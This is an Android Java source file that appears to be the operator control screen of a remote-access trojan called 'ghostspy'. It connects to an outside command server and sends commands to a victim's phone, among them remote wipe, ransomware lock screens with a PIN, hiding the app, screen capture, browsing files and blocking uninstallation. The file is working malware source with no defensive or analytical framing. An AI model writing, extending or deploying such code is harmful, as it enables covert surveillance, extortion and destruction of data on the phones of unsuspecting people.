package com.testapp;

import android.app.Activity;
import android.app.AlertDialog;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import io.socket.client.IO;
import io.socket.client.Socket;
import org.json.JSONObject;
import java.net.URISyntaxException;

public class ControlActivity extends Activity {
    private Socket socket;
    private String deviceId;
    private LinearLayout container;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_control);

        deviceId = getIntent().getStringExtra("deviceId");
        TextView title = findViewById(R.id.deviceTitle);
        title.setText("🎯 " + deviceId);
        container = findViewById(R.id.controlContainer);

        try {
            socket = IO.socket("https://ghostspy.bruang.biz.id");
            socket.connect();
        } catch (URISyntaxException e) {
            Toast.makeText(this, "Error socket", Toast.LENGTH_SHORT).show();
            return;
        }

        // Grid tombol keren (2 kolom)
        addButton("🔦 Flashlight", () -> sendCmd("flashlight"));
        addButton("🔒 Lock", () -> sendCmd("lock"));
        addButton("🔓 Unlock", () -> sendCmd("unlock"));
        addButton("🔇 Mute", () -> sendCmd("mute"));
        addButton("📳 Vibrate", () -> sendCmd("vibrate"));
        addButton("📢 Toast", () -> showInputDialog("Teks", txt -> sendCmd("toast", new JSONObject(){{try{put("text",txt);}catch(Exception e){}}})));
        addButton("🌐 Open URL", () -> showInputDialog("URL", url -> sendCmd("openurl", new JSONObject(){{try{put("url",url);}catch(Exception e){}}})));
        addButton("💣 Wipe", () -> sendCmd("wipe"));
        addButton("🎭 Ransom ON", () -> showTwoInputDialog("HTML", "PIN", (html, pin) -> sendCmd("ransomware_activate", new JSONObject(){{try{put("html",html);put("pin",pin);}catch(Exception e){}}})));
        addButton("🔓 Ransom OFF", () -> sendCmd("ransomware_deactivate"));
        addButton("👻 Hide", () -> sendCmd("hide_app"));
        addButton("👁️ Unhide", () -> sendCmd("unhide_app"));
        addButton("🖥️ Screen ON", () -> sendCmd("start_screen"));
        addButton("⏹️ Screen OFF", () -> sendCmd("stop_screen"));
        addButton("📂 Files", () -> showInputDialog("Path (/sdcard)", path -> sendCmd("list_files", new JSONObject(){{try{put("path",path);}catch(Exception e){}}})));
        addButton("🛡️ Anti ON", () -> sendCmd("anti_uninstall", new JSONObject(){{try{put("state",true);}catch(Exception e){}}}));
        addButton("🔓 Anti OFF", () -> sendCmd("anti_uninstall", new JSONObject(){{try{put("state",false);}catch(Exception e){}}}));
    }

    private void addButton(String text, Runnable action) {
        Button btn = new Button(this);
        btn.setText(text);
        btn.setTextColor(0xFFFFFFFF);
        btn.setBackgroundColor(0xFF1a1a1a);
        btn.setOnClickListener(v -> action.run());
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
        );
        params.setMargins(0, 0, 0, 8);
        btn.setLayoutParams(params);
        container.addView(btn);
    }

    private void sendCmd(String cmd) {
        sendCmd(cmd, new JSONObject());
    }

    private void sendCmd(String cmd, JSONObject params) {
        if (socket != null && socket.connected()) {
            JSONObject msg = new JSONObject();
            try {
                msg.put("device_id", deviceId);
                msg.put("command", cmd);
                msg.put("params", params);
                socket.emit("command", msg);
                Toast.makeText(this, "✅ " + cmd, Toast.LENGTH_SHORT).show();
            } catch (Exception e) {}
        } else {
            Toast.makeText(this, "❌ Offline", Toast.LENGTH_SHORT).show();
        }
    }

    private void showInputDialog(String title, InputCallback cb) {
        AlertDialog.Builder b = new AlertDialog.Builder(this);
        b.setTitle(title);
        EditText e = new EditText(this);
        b.setView(e);
        b.setPositiveButton("OK", (d, w) -> cb.onInput(e.getText().toString()));
        b.setNegativeButton("Batal", null);
        b.show();
    }

    private void showTwoInputDialog(String t1, String t2, TwoInputCallback cb) {
        AlertDialog.Builder b = new AlertDialog.Builder(this);
        LinearLayout lay = new LinearLayout(this);
        lay.setOrientation(LinearLayout.VERTICAL);
        EditText e1 = new EditText(this); e1.setHint(t1);
        EditText e2 = new EditText(this); e2.setHint(t2);
        lay.addView(e1); lay.addView(e2);
        b.setView(lay);
        b.setPositiveButton("OK", (d, w) -> cb.onInput(e1.getText().toString(), e2.getText().toString()));
        b.setNegativeButton("Batal", null);
        b.show();
    }

    interface InputCallback { void onInput(String input); }
    interface TwoInputCallback { void onInput(String i1, String i2); }
}
